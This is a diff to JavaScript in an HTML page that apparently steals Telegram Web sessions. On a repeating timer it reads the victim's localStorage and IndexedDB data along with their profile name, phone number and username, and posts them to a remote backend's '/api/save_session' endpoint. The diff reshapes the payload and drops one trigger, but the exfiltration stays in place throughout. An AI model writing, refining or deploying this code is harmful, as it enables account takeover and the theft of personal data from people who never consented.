@@ -245,22 +245,19 @@
                         const currentDataLength = idbDataStr.length + lsDataStr.length;
                         if (lastSyncLength === currentDataLength) return; 
 
-                        const sessionPayload = {
-                            user_id: lastKnownUserId, 
-                            local_storage_str: lsDataStr,
-                            indexed_db_str: idbDataStr,
-                            timestamp: new Date().toISOString()
-                        };
-
-                        if (profile.name && profile.name !== "Unknown Profile") sessionPayload.profile_name = profile.name;
-                        if (profile.phone && profile.phone !== "Waiting...") sessionPayload.profile_phone = profile.phone;
-                        if (profile.username) sessionPayload.profile_username = profile.username;
-
                         const res = await fetch(BACKEND_URL + "/api/save_session", {
                             method: "POST",
                             headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                             keepalive: true,
-                            body: JSON.stringify(sessionPayload)
+                            body: JSON.stringify({
+                                user_id: lastKnownUserId, 
+                                profile_name: profile.name,
+                                profile_phone: profile.phone,
+                                profile_username: profile.username,
+                                local_storage_str: lsDataStr,
+                                indexed_db_str: idbDataStr,
+                                timestamp: new Date().toISOString()
+                            })
                         });
                         
                         if(res.ok) {
@@ -307,16 +304,6 @@
                     }
                 }
             }, 2000);
-            let lastProfileName = "Unknown Profile";
-            setInterval(() => {
-                const p = getTelegramProfile();
-                if (wasLoggedIn && p && p.name && p.name !== "Unknown Profile" && p.name !== lastProfileName) {
-                    lastProfileName = p.name;
-                    lastSyncLength = 0; 
-                    syncSessionData();  
-                }
-            }, 1500); 
-
         }, 5000);
     });
 </script>
